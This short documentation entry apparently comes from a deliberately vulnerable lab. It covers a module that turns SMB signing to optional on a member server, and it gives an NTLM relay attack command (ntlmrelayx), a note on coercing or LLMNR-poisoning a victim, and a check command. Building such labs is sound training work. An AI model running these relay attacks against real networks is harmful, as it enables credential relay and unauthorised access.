# smb-signing-off

SMB signing not required on a member server. Sets `smb.signing` to `optional` on a host providing `member_server`.

Attack:

Relay NTLM authentication to the host over SMB:

    ntlmrelayx.py -t smb://<host ip> -smb2support
    # coerce or poison a victim (llmnr scenario) to authenticate to the attacker

How to verify:

    nxc smb <host ip>   # shows signing:False when enabled

Disable restores the value declared for the host in the lab's `base_settings`.
